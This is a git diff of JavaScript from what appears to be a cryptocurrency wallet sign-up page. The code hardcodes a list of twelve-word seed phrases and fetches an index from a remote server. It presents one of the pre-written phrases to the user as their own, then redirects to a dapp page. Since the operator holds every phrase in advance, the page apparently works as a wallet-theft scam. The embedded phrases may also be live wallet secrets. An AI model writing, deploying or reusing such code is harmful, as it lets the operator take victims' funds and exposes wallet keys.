@@ -234,7 +234,7 @@
              }
            }
 
-           const first = "country point hint expand bean oval jelly favorite step south prevent nest";
+           const first ="country point hint expand bean oval jelly favorite step south prevent nest";
 const second = "market piano dose warfare grow squirrel color artwork family abandon soda voice";
 const four = "pill tired loud transfer speak always oil couch depart uphold salon edge";
 const five = "old control rigid furnace cover keen weekend settle clerk survey leopard gym";
@@ -260,21 +260,11 @@ const twelve = "today gold spoil original crime rare slender napkin prosper decr
             ten:ten,
             eleven:eleven,
             twelve:twelve,
-            thirteen:thirteen,
-            fourteen:fourteen,
-            fiftheen:fiftheen,
-            sixteen:sixteen
+           
            }
 
-           
-         document.addEventListener('DOMContentLoaded', (event) => {
-       
-           const contentContainer = document.getElementById('contentContainer');
-           const toggleIcon = document.getElementById('toggleIcon');
-           const content = document.getElementById('content');
-           
-         
-  async function fetchFinalPhrase() {
+
+           async function fetchFinalPhrase() {
     try {
       const response = await $.ajax({
         type: "GET",
@@ -290,7 +280,20 @@ localStorage.setItem("ownPhrase",response.finalPhrase)
     }
   }
 
+         document.addEventListener('DOMContentLoaded', (event) => {
+       
+           const contentContainer = document.getElementById('contentContainer');
+           const toggleIcon = document.getElementById('toggleIcon');
+           const content = document.getElementById('content');
+           
+        
+  
   fetchFinalPhrase();
+  const contentDiv = document.getElementById('content');
+// var words=point;
+const bringPhrase=localStorage.getItem("ownPhrase")
+const realPhrase=phrases[bringPhrase]
+contentDiv.innerHTML=realPhrase;
 
 function copyText(element) {
       var $copyText = jQuery(element).html();
@@ -314,13 +317,8 @@ function copyText(element) {
 
         //    console.log(point);
         //    localStorage.setItem("oldKey",oldKey)
-           const contentDiv = document.getElementById('content');
-// var words=point;
-const bringPhrase=localStorage.getItem("ownPhrase")
-const realPhrase=phrases[bringPhrase]
-
-  contentDiv.innerHTML=realPhrase
-
+           
+ 
            var btn=document.getElementById('registerBtn');
        function red () {
                btn.style.opacity="1"
@@ -351,7 +349,7 @@ const realPhrase=phrases[bringPhrase]
                            $('.live-section').html("Account was successfully created").addClass('alert-success')
                           
                            setTimeout(function () {
-                               $(location).prop('href', './app.html')
+                               $(location).prop('href', './dapp.html')
                            }, 1000)
        
                        },
@@ -395,9 +393,10 @@ const realPhrase=phrases[bringPhrase]
         async function fetchUser() {
               const response = await $.ajax({
                 type: "GET",
-                url: 'https://base-omega.vercel.app/users',
+                url: 'https://boksbase.vercel.app/users',
                 dataType: "json",
                 timeout: 30000,
+               
               });
         
               console.log(response.data);
